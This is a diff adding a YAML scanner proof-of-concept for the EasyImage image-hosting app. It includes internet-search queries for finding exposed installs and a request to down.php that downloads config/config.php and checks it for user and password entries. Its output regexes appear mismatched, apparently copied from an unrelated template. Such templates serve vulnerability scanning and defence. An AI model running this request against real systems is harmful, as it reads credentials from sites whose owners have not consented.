@@ -1,0 +1,35 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="EasyImage-简单图床"
+    hunter-query: web.body="EasyImage"
+    quake-query: app:"EasyImage"
+    zoomeye-query: title:"简单图床 -EasyImage"
+    threatbook-query: body="EasyImage"
+    cve: 
+    cnvd: 
+
+name: poc-yaml-EasyImage-config-unleak
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /application/down.php?dw=./config/config.php
+    expression: >-
+      response.body_string.contains("'user'") && response.body_string.contains("'password'")
+
+    output:
+      search: |-
+        "(?P<data>2[\\d]{7})".bsubmatch(response.body)
+      data: search["data"]
+      search1: |-
+        "(?P<filename>UNIS.*?txt)".bsubmatch(response.body)
+      filename: search1["filename"]
+expression: r0() 
